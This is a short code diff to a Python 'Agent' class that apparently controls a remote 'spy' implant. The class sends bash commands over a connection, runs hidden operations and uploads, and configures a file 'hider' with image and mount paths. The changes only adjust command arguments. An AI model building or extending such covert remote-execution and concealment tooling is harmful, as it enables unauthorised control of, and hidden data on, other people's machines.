@@ -29,7 +29,7 @@ class Agent:
         return Agent(conn, "spy")
 
     def run_bash(self, bash: str) -> tuple[Responce, str]:
-        self.conn.send_command(Command(len(bash), FunCode.RUN_BASH, bash))
+        self.conn.send_command(Command(len(bash), FunCode.RUN_BASH, 0, bash))
         return self.conn.recv_full_responce()
 
     """
@@ -74,7 +74,7 @@ class Agent:
     def hidden_action_without_upload(self, fncode: FunCode) -> tuple[Responce, str]:
         assert FunCode.HIDDEN_UPLOAD not in fncode
 
-        self.conn.send_command(Command(0, FunCode.HIDDEN_OPRATION | fncode, ""))
+        self.conn.send_command(Command(0, FunCode.HIDDEN_OPRATION | fncode, 0, ""))
         results = list()
         results.append(self.conn.recv_bytes(Status.sizeof))
         results.append(self.conn.recv_bytes(Status.sizeof))
@@ -107,9 +107,9 @@ class Agent:
     # prob redundant in future
     def hider_setup(self, hiderPath: str, imagePath: str, mountPath: str) -> Responce:
         self.mountPath = mountPath
-        self.hiding_env_setup(imagePath)
+        # self.hiding_env_setup(imagePath)
 
-        strParam = hiderPath + ";" + imagePath + ";" + mountPath
+        strParam = hiderPath  # +  ";" + imagePath + ";" + mountPath
         self.conn.send_command(Command(0, FunCode.HIDER_SETUP, 0, strParam))
         return self.conn.recv_responce_struct()
 
